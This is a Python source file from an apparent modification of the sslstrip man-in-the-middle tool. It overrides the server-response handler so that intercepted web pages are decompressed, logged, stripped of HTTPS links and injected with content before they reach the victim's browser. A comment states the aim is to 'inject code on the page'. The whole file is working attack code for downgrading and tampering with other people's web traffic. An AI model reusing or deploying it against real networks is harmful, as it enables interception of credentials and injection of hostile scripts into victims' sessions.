# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging, re, string, random, zlib, gzip, StringIO

from twisted.web.http import HTTPClient
from sslstrip.URLMonitor import URLMonitor
from sslstrip.ServerConnection import ServerConnection

class S1ServerConnection(ServerConnection):

    def __init__(self, command, uri, postData, headers, client):
        ServerConnection.__init__(self, command, uri, postData, headers, client)
	
	# SizeOne mod
	#we need to replace this in order to be able to inject code on the page
	#this is not very efficient, the data needs to be all downloaded before
	#sending to client, if it is a big download, it's going to be a problem
    def handleResponse(self, data):
        if (self.isCompressed):
            logging.debug("Decompressing content...")
            data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
            
        logging.log(self.getLogLevel(), "Read from server:\n" + data)

        data = self.replaceSecureLinks(data)
        ct = self.client.responseHeaders.getRawHeaders('content-type')
        data = S1ServerConnection.pmgr.injectContent(self.client,ct,data)

        if (self.contentLength != None):
            self.client.setHeader('Content-Length', len(data))
        
        #due to some bug this is sometimes called after the client already closed the connection
        #supid fix just add try
        try:
            self.client.write(data)
            self.shutdown()
        except RuntimeError:
            logging.error("BUG write was called after client closed connection!")
